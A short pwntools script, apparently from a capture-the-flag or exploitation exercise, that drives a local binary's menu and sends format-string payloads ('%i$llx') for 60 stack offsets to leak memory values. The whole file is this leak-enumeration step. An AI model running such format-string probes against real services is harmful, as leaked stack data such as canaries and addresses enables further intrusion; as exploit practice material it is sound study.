#!/usr/bin/python3

from pwn import *

s = process("./ac.out")

for i in range(60):
    s.recvuntil(b'?')
    s.sendline(b'3')
    print('.', end="")
    s.recvuntil(b']')
    s.sendline(b'y')
    print('.', end="")
    s.recvuntil(b']')
    s.sendline(b'y')
    print('.', end="")
    s.recvuntil(b'?')
    s.sendline(b'%' + str(i).encode() + b'$llx')
    print('.')
    s.recvuntil(b"specimen:\n")
    print(i)
    print(s.recvline())
